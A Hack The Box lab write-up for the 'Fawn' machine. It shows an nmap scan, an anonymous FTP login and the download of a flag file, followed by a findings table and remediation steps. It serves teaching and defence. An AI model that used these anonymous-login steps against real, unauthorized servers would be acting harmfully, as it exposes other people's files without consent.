# HTB Starting Point — Fawn

**Platform:** Hack The Box — Starting Point (Tier 0)  
**Difficulty:** Very Easy  
**OS:** Linux  
**Date:** 2025  
**Author:** Federico [Cognome] | [LinkedIn] | [GitHub]  
**Status:** Pwned ✅

---

## Summary

Fawn is an introductory Linux machine exposing an FTP service misconfigured to allow anonymous login. No credentials are required to access the filesystem, where the flag is stored in plaintext.

---

## Enumeration

```bash
sudo nmap -sV <IP>
```

**Result:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 3.0.3 |

**Analysis:** FTP (File Transfer Protocol) transmits data and credentials in cleartext. Identifying the specific version (vsftpd 3.0.3) is useful for cross-referencing known CVEs. In this case, the more immediate issue is configuration — not a software vulnerability.

---

## Exploitation

FTP servers are frequently misconfigured to allow **anonymous login**: a built-in feature designed for public file distribution that is often left enabled unintentionally on internal or misconfigured servers.

```bash
ftp <IP>
```

```
Connected to <IP>.
Name: anonymous
Password: [blank]
230 Login successful.
```

Once connected, standard FTP commands were used to enumerate the filesystem.

```bash
# Verify target OS
ftp> system
UNIX Type: L8

# List available files
ftp> ls
-rw-r--r-- 1 0 0 32 Jun 04 flag.txt

# Download the flag to local machine
ftp> get flag.txt
ftp> bye
```

**Why this works:** The `anonymous` username is a well-known default in FTP. When enabled without restriction, it allows any user to authenticate without a password, gaining read (and sometimes write) access to the exposed directory.

---

## Finding

| Field | Detail |
|-------|--------|
| **Vulnerability** | FTP anonymous login enabled |
| **Severity** | High |
| **Component** | FTP service — port 21/tcp |
| **Authentication required** | No |

**Impact:** Any unauthenticated remote user can access the files exposed via FTP. Depending on directory permissions, this may lead to sensitive data exposure or, in write-enabled configurations, arbitrary file upload.

---

## Flag

```bash
cat flag.txt
```

---

## Remediation

- Disable anonymous FTP login unless explicitly required for public distribution
- Replace FTP with SFTP or FTPS to ensure encrypted data transmission
- Restrict FTP access by IP range using firewall rules
- Audit FTP directory permissions to prevent unintended file exposure

---

*This report was produced for educational purposes within an authorized environment (Hack The Box).*
